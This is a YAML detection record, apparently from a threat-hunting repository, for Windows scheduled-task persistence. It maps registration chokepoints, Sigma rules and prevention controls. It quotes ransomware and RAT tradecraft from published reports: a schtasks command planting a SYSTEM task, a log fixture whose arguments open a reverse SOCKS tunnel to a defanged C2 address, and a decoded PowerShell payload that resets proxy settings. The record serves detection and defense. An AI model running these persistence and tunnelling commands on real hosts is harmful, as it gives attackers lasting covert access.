@@ -1,0 +1,235 @@
+Name: 'Scheduled Task Registration'
+Id: 749265c4-5af7-49c3-a9d3-62e2cc9eb8e1
+MitreIds:
+- T1053.005
+- T1053
+Tactics:
+- Persistence
+Techniques:
+- 'Scheduled Task/Job: Scheduled Task'
+LastUpdated: '2026-09-07'
+Author: '@iimp0ster'
+DetectionPriority: HIGH
+ThreatPrevalence: HIGH
+DetectionDifficulty: MEDIUM
+Description: >
+  Detects the required Windows Task Scheduler registration boundary used by adversaries to obtain scheduler-managed persistence or execution. Task names, triggers, and payloads vary, but the task definition must be registered before Task Scheduler can run it.
+Prerequisites:
+- 'Windows Security auditing records Event ID 4698 and forwards TaskName and TaskContentNew (or TaskContent) to the telemetry backend.'
+AttackerControls:
+- 'Task name, trigger, principal, and action command'
+- 'Whether registration uses schtasks.exe, PowerShell ScheduledTasks cmdlets, or the Task Scheduler API'
+AttackerCannotControl:
+- 'A scheduler-managed job requires creation or modification of a task definition'
+- 'The operating system must persist the registered task and its execution context'
+Chokepoints:
+- Stage: 'Task registration request'
+  Input: 'A local or remote caller submits a task definition through schtasks.exe, PowerShell, WMI, COM, or the ScheduledTasks API'
+  Invariant: 'Scheduler-managed execution begins with a task-registration request containing a trigger, principal, and action.'
+  Observable: 'Process, PowerShell, WMI, or RPC telemetry records the caller and registration interface before the task can be accepted.'
+  WhyCantBypass: 'Changing the registration API changes the caller telemetry but does not remove the required registration request.'
+  LogSources:
+  - 'Process creation, PowerShell Script Block Logging, WMI Activity, or Task Scheduler RPC telemetry'
+  DetectionTier: Hunt
+  SigmaRef: 'sigma-rules/scheduled-task-job-scheduled-task/hunt.yml'
+- Stage: 'Task definition registration'
+  Input: 'A task name, trigger, principal, and action supplied through a supported Task Scheduler interface'
+  Invariant: 'The adversary must register or modify a Windows scheduled task before Task Scheduler can execute the documented job.'
+  Observable: 'Security Event 4698/4702 and TaskScheduler Operational telemetry describe the registered definition and execution context.'
+  WhyCantBypass: 'Changing the task name, trigger, payload, or registration API does not remove the scheduler registration required for scheduler-managed execution.'
+  LogSources:
+  - 'Windows Security Event ID 4698/4702'
+  - 'Microsoft-Windows-TaskScheduler/Operational'
+  - 'Process creation for schtasks.exe or PowerShell ScheduledTasks cmdlets'
+  DetectionTier: Research
+  SigmaRef: 'sigma-rules/scheduled-task-job-scheduled-task/research.yml'
+- Stage: 'Scheduler-managed execution context'
+  Input: 'The persisted task definition is evaluated under its declared trigger and principal'
+  Invariant: 'Task Scheduler must load the registered definition before it can launch the action in scheduler context.'
+  Observable: 'TaskScheduler Operational events and correlated process creation expose the task identity, principal, and spawned action.'
+  WhyCantBypass: 'An adversary can avoid execution telemetry only by abandoning Task Scheduler, which exits this chokepoint.'
+  LogSources:
+  - 'Microsoft-Windows-TaskScheduler/Operational and process creation telemetry'
+  DetectionTier: Analyst
+  SigmaRef: 'sigma-rules/scheduled-task-job-scheduled-task/analyst.yml'
+Variations:
+- Name: 'The Gentlemen WindowsConnSvc task'
+  FirstSeen: '2026-05-21'
+  Status: Emerging
+  SourceURL: 'https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps'
+  Notes: 'The report documents a SYSTEM scheduled task named WindowsConnSvc launching C:\Windows\Temp\svchost32.exe for persistent C2 access.'
+  Command:
+    Context: 'A command shell creates a SYSTEM task named WindowsConnSvc on a minute schedule.'
+    Invocation: 'schtasks /create /tn WindowsConnSvc /tr C:\Windows\Temp\svchost32.exe /sc minute /ru SYSTEM'
+    Artifacts:
+    - 'TaskName: WindowsConnSvc'
+    - 'Action path: C:\Windows\Temp\svchost32.exe'
+  VariantId: 'gentlemen-windowsconnsvc'
+  ChokepointMapping: 'The task name and payload are attacker-controlled; Windows still requires a persisted Task Scheduler definition.'
+- Name: 'Exodus RAT INetHealth task'
+  FirstSeen: '2026-09-01'
+  Status: Emerging
+  SourceURL: 'https://www.huntress.com/blog/exodus-crypto-wallet-installer-rat'
+  Notes: 'The report documents an INetHealth scheduled task launching headless PowerShell with an encoded command.'
+  Command:
+    Context: 'A scheduled task named INetHealth launches a headless PowerShell action.'
+    Invocation: 'conhost.exe --headless powershell -e [Base64 blob; encoded value not published by the source]'
+    DecodedPayload: |
+      $xbzshxel = @'
+      [DllImport("wininet.dll", SetLastError = true, CharSet=CharSet.Auto)]
+      public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
+      '@
+      $hapiuysw = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+      Set-ItemProperty -path $hapiuysw ProxyEnable   -value 0  -ErrorAction Stop
+      Set-ItemProperty -path $hapiuysw ProxyServer   -value "" -ErrorAction Stop
+      Set-ItemProperty -path $hapiuysw AutoConfigURL -Value "" -ErrorAction Stop
+      $miihtwvx = Add-Type -MemberDefinition $xbzshxel -Name syjtmthn -PassThru
+      $gmsqtp = $miihtwvx::InternetSetOption(0, 39, 0, 0)
+      $pfoguq = $miihtwvx::InternetSetOption(0, 37, 0, 0)
+    Artifacts:
+    - 'TaskName: INetHealth'
+    - 'Action includes conhost.exe, powershell, and a Base64-encoded argument'
+    - 'Decoded behavior clears ProxyEnable, ProxyServer, and AutoConfigURL, then refreshes WinINet settings'
+  VariantId: 'exodus-inethealth'
+  ChokepointMapping: 'A different task name and command still cross the same Task Scheduler registration boundary.'
+Detections:
+- Level: Research
+  Description: 'Find scheduled tasks whose definitions execute from commonly writable paths or invoke headless encoded PowerShell.'
+  LogSources:
+  - 'Windows Security Event ID 4698'
+  Logic: 'EventID 4698 and TaskContentNew contains an AppData/Temp path or the conhost.exe --headless PowerShell encoded-command shape.'
+  ExpectedFPRate: Medium
+  UseCase: 'Broad hunt for scheduler-managed execution from writable locations'
+  SigmaRule: 'sigma-rules/scheduled-task-job-scheduled-task/research.yml'
+- Level: Hunt
+  Description: 'Prioritize writable-path interpreter tasks and headless encoded PowerShell task actions.'
+  LogSources:
+  - 'Windows Security Event ID 4698'
+  Logic: 'EventID 4698 plus either a writable path with an interpreter/suspicious executable or the headless encoded PowerShell action shape.'
+  ExpectedFPRate: Low
+  UseCase: 'Behavioral threat hunt across task-name and registration-method variants'
+  SigmaRule: 'sigma-rules/scheduled-task-job-scheduled-task/hunt.yml'
+- Level: Analyst
+  Description: 'Match the two source-grounded high-confidence WindowsConnSvc and INetHealth task shapes.'
+  LogSources:
+  - 'Windows Security Event ID 4698'
+  Logic: 'EventID 4698 and either the WindowsConnSvc/svchost32.exe report shape or the INetHealth/headless encoded PowerShell report shape.'
+  ExpectedFPRate: Low
+  UseCase: 'High-confidence triage with direct source or controlled-lab context'
+  SigmaRule: 'sigma-rules/scheduled-task-job-scheduled-task/analyst.yml'
+Intel:
+- Name: 'The Gentlemen Ransomware — Defense Evasion TTPs Uncovered'
+  Tier: primary
+  URL: 'https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps'
+  Description: 'Primary source for the WindowsConnSvc scheduled-task procedure.'
+- Name: 'The Crypto Wallet That Never Opened: Tampered Exodus Installer Hides a Modular RAT'
+  Tier: supporting
+  URL: 'https://www.huntress.com/blog/exodus-crypto-wallet-installer-rat'
+  Description: 'Independent source for the INetHealth scheduled-task variation.'
+- Name: 'MITRE ATT&CK T1053.005'
+  Tier: primary
+  URL: 'https://attack.mitre.org/techniques/T1053/005/'
+  Description: 'Canonical Scheduled Task/Job technique definition.'
+EvolutionTimeline:
+- Date: '2026-05-21'
+  Event: 'The Gentlemen procedure published'
+  Change: 'WindowsConnSvc added as a source-grounded scheduled-task variation.'
+  DetectionImpact: 'Adds a SYSTEM task launching a Windows Temp executable to high-confidence triage.'
+  TheConstant: 'Task Scheduler registration remains required.'
+- Date: '2026-09-01'
+  Event: 'Exodus RAT procedure published'
+  Change: 'INetHealth added as an independent encoded-PowerShell variation.'
+  DetectionImpact: 'Confirms the invariant across different task names and action types.'
+  TheConstant: 'Task Scheduler registration remains required.'
+RelatedChokepoints:
+- remote-execution-tools
+PreventionSummary: >
+  Restrict who can register tasks and which binaries Task Scheduler may launch. Application control and least-privilege task-registration policy reduce abuse even when an attacker changes the task name, trigger, or registration API.
+PreventionOpportunities:
+- Category: 'Endpoint · Application Control'
+  Control: 'Block or constrain task actions that execute unsigned binaries and interpreters from user-writable or temporary directories.'
+  Impact: 'Prevents the most common malicious task actions from progressing after registration while preserving approved scheduler use.'
+- Category: 'Identity · Least Privilege'
+  Control: 'Limit remote administration and local principals permitted to create SYSTEM-level scheduled tasks.'
+  Impact: 'Reduces the identities able to cross the task-registration boundary with elevated execution context.'
+RawLogs:
+- Type: 'Windows Security'
+  EventId: 4698
+  Source: 'Security'
+  Description: 'The Gentlemen WindowsConnSvc task — source-shaped Event 4698 fixture'
+  EvidenceBasis: 'Normalized only from the task name, schedule, principal, action, and arguments published in the Huntress report; no unrelated Event 4698 metadata is invented.'
+  SourceURL: 'https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps'
+  MatchedRules:
+  - Research
+  - Hunt
+  - Analyst
+  Sample: |
+    EventID: 4698
+    TaskName: \\WindowsConnSvc
+    TaskContentNew:
+      <Task>
+        <Triggers>
+          <CalendarTrigger>
+            <Repetition><Interval>PT2M</Interval></Repetition>
+          </CalendarTrigger>
+        </Triggers>
+        <Principals>
+          <Principal><UserId>SYSTEM</UserId></Principal>
+        </Principals>
+        <Actions>
+          <Exec>
+            <Command>C:\Windows\Temp\svchost32.exe</Command>
+            <Arguments>client 77.110.122[.]137:37182 R:1085:socks</Arguments>
+          </Exec>
+        </Actions>
+      </Task>
+- Type: 'Windows Security'
+  EventId: 4698
+  Source: 'Security'
+  Description: 'Exodus RAT INetHealth task — source-shaped Event 4698 fixture'
+  EvidenceBasis: 'Normalized from the task name, action prefix, and decoded PowerShell published in the Huntress report. The report did not publish the original Base64 argument or a native Event 4698 record.'
+  SourceURL: 'https://www.huntress.com/blog/exodus-crypto-wallet-installer-rat'
+  MatchedRules:
+  - Research
+  - Hunt
+  - Analyst
+  Sample: |
+    EventID: 4698
+    TaskName: \\INetHealth
+    TaskContentNew:
+      <Task>
+        <Actions>
+          <Exec>
+            <Command>conhost.exe</Command>
+            <Arguments>--headless powershell -e [Base64 value not published by source]</Arguments>
+          </Exec>
+        </Actions>
+      </Task>
+
+    Decoded task argument published by source:
+      $xbzshxel = @'
+      [DllImport("wininet.dll", SetLastError = true, CharSet=CharSet.Auto)]
+      public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
+      '@
+      $hapiuysw = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+      Set-ItemProperty -path $hapiuysw ProxyEnable   -value 0  -ErrorAction Stop
+      Set-ItemProperty -path $hapiuysw ProxyServer   -value "" -ErrorAction Stop
+      Set-ItemProperty -path $hapiuysw AutoConfigURL -Value "" -ErrorAction Stop
+      $miihtwvx = Add-Type -MemberDefinition $xbzshxel -Name syjtmthn -PassThru
+      $gmsqtp = $miihtwvx::InternetSetOption(0, 39, 0, 0)
+      $pfoguq = $miihtwvx::InternetSetOption(0, 37, 0, 0)
+EmulationScript:
+  File: 'emulation/scheduled-task-job-scheduled-task/emulate.ps1'
+  Language: powershell
+  Description: 'Registers seven inert scheduled-task definitions spanning a negative control, generic Research and Hunt coverage, and both source-grounded Analyst shapes; none of the registered actions are started.'
+  SafetyNotes: 'Runs only in the isolated Ludus Windows VM inside an Intelopes-owned snapshot bracket and restores the guest afterward.'
+  AtomicRef: T1053.005
+OsintSources:
+- Platform: 'GitHub Code Search'
+  Query: '"WindowsConnSvc" "svchost32.exe"'
+  URL: 'https://github.com/search?q=%22WindowsConnSvc%22+%22svchost32.exe%22&type=code'
+  Notes: 'Finds public rule, report, and research references that preserve the source-grounded task-name and action pair.'
+- Platform: 'VirusTotal Intelligence'
+  Query: 'behaviour_processes:"schtasks.exe" behaviour_command_line:"WindowsConnSvc"'
+  URL: 'https://www.virustotal.com/gui/search/behaviour_processes%3A%22schtasks.exe%22%20behaviour_command_line%3A%22WindowsConnSvc%22'
+  Notes: 'Subscription-dependent passive pivot for sandbox behavior containing the documented scheduled-task name.'
